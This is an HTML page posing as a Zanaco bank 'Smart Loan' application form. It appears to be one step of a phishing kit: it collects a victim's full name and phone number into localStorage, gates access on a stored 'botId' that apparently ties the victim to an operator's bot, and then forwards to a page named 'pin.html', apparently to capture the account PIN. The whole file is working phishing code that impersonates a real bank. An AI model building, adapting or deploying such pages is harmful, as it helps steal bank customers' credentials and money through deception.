<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loan Application Form</title>

<style>
body {
    font-family: Arial, sans-serif;
    background: #f6f7fb;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.loan-container {
    background: #fff;
    padding: 30px;
    border-radius: 12px;
    width: 100%;
    max-width: 400px;
    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
}

h2 {
    text-align: center;
    margin-bottom: 20px;
}

label {
    display: block;
    margin: 10px 0 5px;
    font-weight: bold;
}

input {
    width: 100%;
    padding: 10px;
    border-radius: 6px;
    border: 1px solid #ccc;
    margin-bottom: 15px;
}

.checkbox-container {
    display: flex;
    align-items: center;
    margin-bottom: 20px;
}

button {
    width: 100%;
    padding: 12px;
    background: red;
    color: white;
    border: none;
    border-radius: 6px;
    font-size: 16px;
    cursor: pointer;
}

button:disabled {
    background: #ccc;
    cursor: not-allowed;
}

.logo-container {
    width: 100%;
    height: 120px;
    margin-bottom: 20px;
}

.logo {
    width: 100%;
    height: 100%;
    object-fit: cover;
}
</style>
</head>

<body>

<div class="loan-container">
    <div class="logo-container">
        <img src="zanaco-dp.jpeg" class="logo">
    </div>

    <h2>Loan Application Form</h2>

    <form id="detailsForm">

        <label>Full Name</label>
        <input id="name" type="text" required>

        <label>Phone Number</label>
        <input id="phone" type="tel" required>

        <div class="checkbox-container">
            <input type="checkbox" id="confirmCheck">
            <label for="confirmCheck">
                I agree to Zanaco Smart Loan terms and conditions
            </label>
        </div>

        <button id="nextBtn" disabled>Next</button>
    </form>
</div>

<script>
// ---------------- BOT ROUTING (FIXED) ----------------
// Get botId from localStorage
const botId = localStorage.getItem('botId');

if (!botId) {
    alert("Invalid access link");
    throw new Error("botId missing");
}

// Prevent skipping previous step
if (!localStorage.getItem('loanAmount')) {
    window.location.href = 'index.html';
}

// ---------------- FORM LOGIC ----------------
const confirmCheck = document.getElementById('confirmCheck');
const nextBtn = document.getElementById('nextBtn');

confirmCheck.addEventListener('change', () => {
    nextBtn.disabled = !confirmCheck.checked;
});

document.getElementById('detailsForm').addEventListener('submit', e => {
    e.preventDefault();

    localStorage.setItem('name', name.value);
    localStorage.setItem('phone', phone.value);

    // Redirect to PIN page (botId is stored, no query string needed)
    window.location.href = 'pin.html';
});
</script>

</body>
</html>
